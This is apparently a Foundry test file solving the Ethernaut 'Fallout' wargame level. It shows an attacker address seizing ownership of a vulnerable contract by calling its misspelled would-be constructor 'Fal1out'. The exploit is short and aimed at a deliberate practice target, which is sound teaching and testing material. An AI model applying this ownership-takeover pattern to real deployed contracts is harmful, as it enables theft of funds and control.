// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutAttackTest is Test{
  Fallout fallout;
  
  function setUp() public {
    fallout = new Fallout();
  }

  function testInitialOwnership() public view{
    assertEq(fallout.owner(), address(0));
  }

  function testShouldStealOwnership() public {
    address attacker = vm.addr(1);
    uint256 attackerBalance = 1 wei;
    vm.deal(attacker, attackerBalance);

    vm.prank(attacker);
    fallout.Fal1out();

    assertEq(fallout.owner(), attacker);
  }
}